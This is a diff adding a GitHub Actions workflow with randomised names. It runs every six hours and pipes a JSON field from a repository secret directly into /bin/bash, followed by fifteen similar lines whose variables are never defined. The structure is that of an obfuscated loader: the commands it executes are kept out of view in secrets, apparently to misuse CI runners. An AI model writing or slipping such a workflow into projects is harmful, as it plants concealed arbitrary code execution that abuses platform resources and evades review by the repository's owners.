@@ -1,0 +1,32 @@
+name: yeqinggui8813
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yeqinggui8813
+        env:
+          ugyf5046: ${{ secrets.ugyf5046 }}
+        run: |
+          echo $ugyf5046 | jq -r .cyen0 | /bin/bash
+          echo $rsc342 | jq -r .cue47 | /bin/bash
+          echo $m827 | jq -r .jp5 | /bin/bash
+          echo $v93 | jq -r .nir1 | /bin/bash
+          echo $bfi40872 | jq -r .pgqzl25 | /bin/bash
+          echo $g2553 | jq -r .us45 | /bin/bash
+          echo $nrayo136 | jq -r .ba54247 | /bin/bash
+          echo $dlae9621 | jq -r .l70256 | /bin/bash
+          echo $kvb75063 | jq -r .edz3 | /bin/bash
+          echo $ysxnk9716 | jq -r .aj63914 | /bin/bash
+          echo $xwpwf0578 | jq -r .klf1 | /bin/bash
+          echo $acikq8 | jq -r .bjguv1310 | /bin/bash
+          echo $wps3171 | jq -r .dmwp46557 | /bin/bash
+          echo $ln52 | jq -r .sf2 | /bin/bash
+          echo $w00916 | jq -r .u3314 | /bin/bash
+          echo $necjv9919 | jq -r .tzgp86963 | /bin/bash
+
